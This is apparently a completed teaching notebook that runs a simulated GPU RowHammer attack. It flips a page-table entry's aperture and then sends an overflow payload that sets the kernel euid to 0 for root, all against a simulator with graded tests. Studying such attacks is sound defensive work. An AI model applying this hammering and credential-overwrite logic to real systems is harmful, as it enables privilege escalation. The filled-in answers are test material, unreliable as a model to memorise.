# %%

# Import the GPUBreach simulator
import sys
from collections.abc import Callable
from pathlib import Path

for _path in [
    str(Path(__file__).resolve().parent),
    str(Path(__file__).resolve().parent.parent),
]:
    if _path not in sys.path:
        sys.path.insert(0, _path)

from aisb_utils import report
from gpubreach_sim import *

# %%
"""
## Initial environment inspection

Start by creating an environment and inspecting the initial state to understand what we're working with.
"""

env = make_environment()

print("── Initial GPUBreach environment ──")
print(f"  PTE victim row      = {PTE_ROW} (DRAM row holding the target PTE)")
print(f"  PTE offset in row   = {PTE_OFFSET_IN_ROW} bytes from row start")
print(f"  GPU virtual address = 0x{VICTIM_GPU_VADDR:x} "
      f"(resolves via the PTE we'll corrupt)")
print(f"  PTE aperture        = {env.victim_pte.aperture} "
      f"(0 = GPU VRAM, 1 = system memory)")
print(f"  Kernel euid         = {env.kernel_cred.euid} "
      f"(0 would mean root)")
print(f"  Hammer threshold    = {HAMMER_THRESHOLD_ACTIVATIONS:,} "
      f"activations per aggressor")
print(f"  ACTIVATE-PRECHARGE  = {ACTIVATE_PRECHARGE_NS} ns")
print(f"  Refresh window      = {REFRESH_WINDOW_MS} ms")
print(f"  Driver buffer size  = {DRIVER_BUFFER_SIZE} bytes "
      f"(cred struct at offset {CRED_OFFSET} in a {PAGE_SIZE} byte page)")

# %%
def find_aggressors(victim_row: int) -> tuple[int, int]:
    """Return the two aggressor rows for double-sided hammering."""
    # TODO: Return (aggressor_a, aggressor_b) such that victim_row is between them
    # and |aggressor_a - aggressor_b| == 2
    return (victim_row-1, victim_row + 1)  
    # return (0, 0)


agg_a, agg_b = find_aggressors(PTE_ROW)
print(f"Ex 2.1: aggressors for PTE_ROW={PTE_ROW} → {agg_a}, {agg_b}")
from day6_final_test import test_find_aggressors


test_find_aggressors(find_aggressors)

env.stage1_aggressors_ok = True
# %%

from time import perf_counter_ns
def hammer_until_flip(dram: DRAM, agg_a: int, agg_b: int, victim_row: int, max_rounds: int = 2_000_000) -> dict:
    """Drive the DRAM into a RowHammer flip on ``victim_row``."""
    # TODO:
    # 1. Initialise total_ns and rounds counters.
    # 2. While `dram.has_flipped(victim_row)` is False (and you are
    #    below `max_rounds`):
    #      - call dram.hammer_once(aggressor_a, aggressor_b)
    #      - add its return value (nanoseconds) to total_ns
    #      - increment rounds
    # 3. Return {"rounds": rounds, "total_ns": total_ns,
    #            "flipped": dram.has_flipped(victim_row)}
    rounds = 0
    total_ns = 0
    while rounds <= max_rounds:
        start = perf_counter_ns()
        time_taken_ns = dram.hammer_once(agg_a, agg_b)
        total_ns += time_taken_ns
        rounds += 1
        if dram.has_flipped(victim_row):
            break
    return {"rounds": rounds, "total_ns": total_ns, "flipped": dram.has_flipped(victim_row)}


flip_run = hammer_until_flip(env.dram, agg_a, agg_b, PTE_ROW)
print(
    f"Ex 2.2: flipped={flip_run['flipped']} after "
    f"{flip_run['rounds']:,} rounds "
    f"({flip_run['total_ns'] / 1_000_000:.2f} ms)"
)
from day6_final_test import test_hammer_until_flip


test_hammer_until_flip(hammer_until_flip)

env.stage2_flipped_in_refresh_window = (
    flip_run["flipped"]
    and flip_run["total_ns"] / 1_000_000 < REFRESH_WINDOW_MS
)
# %%


def trigger_pte_refresh(env: Environment) -> tuple[int, int]:
    """Resync the PT from DRAM. Return (before_aperture, after_aperture)."""
    # TODO: Capture before value, call sync_from_dram, capture after value
    before = env.page_table.cached_pte.aperture
    env.page_table.sync_from_dram(env.dram)
    after = env.page_table.cached_pte.aperture
    return (before, after)


before, after = trigger_pte_refresh(env)
print(f"Ex 2.3: aperture {before} → {after} (expected 0 → 1)")
from day6_final_test import test_trigger_pte_refresh


test_trigger_pte_refresh(trigger_pte_refresh)

env.stage3_aperture_changed = (before, after) == (
    APERTURE_GPU_LOCAL,
    APERTURE_SYSTEM,
)
# %%


def craft_overflow_payload(new_euid: int = 0) -> bytes:
    """Return a DMA payload that overflows the driver buffer into euid."""
    # TODO:
    # 1. Fill `DRIVER_BUFFER_SIZE` bytes (e.g. b"A" repeated).
    # 2. Append the little-endian 4-byte encoding of `new_euid`.
    # 3. Return filler + euid_bytes.
    return b"A"*DRIVER_BUFFER_SIZE + new_euid.to_bytes(4, 'little')


payload = craft_overflow_payload()
print(
    f"Ex 2.4: payload={len(payload)} bytes "
    f"({DRIVER_BUFFER_SIZE} filler + 4 euid)"
)
from day6_final_test import test_craft_overflow_payload


test_craft_overflow_payload(craft_overflow_payload)
# %%


def escalate_privileges(env: Environment, payload: bytes) -> bool:
    """Perform the DMA. Return True iff the cred struct now shows root."""
    # TODO:
    # 1. Call perform_gpu_dma(payload, VICTIM_GPU_VADDR,
    #    env.page_table, env.iommu, env.dram, env.driver_page).
    # 2. Return env.kernel_cred.is_root().
    perform_gpu_dma(payload, VICTIM_GPU_VADDR, env.page_table, env.iommu, env.dram, env.driver_page)
    return env.kernel_cred.is_root()


rooted = escalate_privileges(env, payload)
print(f"Ex 2.5: root achieved? {rooted}")
from day6_final_test import test_escalate_privileges


test_escalate_privileges(escalate_privileges)

env.stage4_root_obtained = rooted
# %%

env.check_all()
# %%
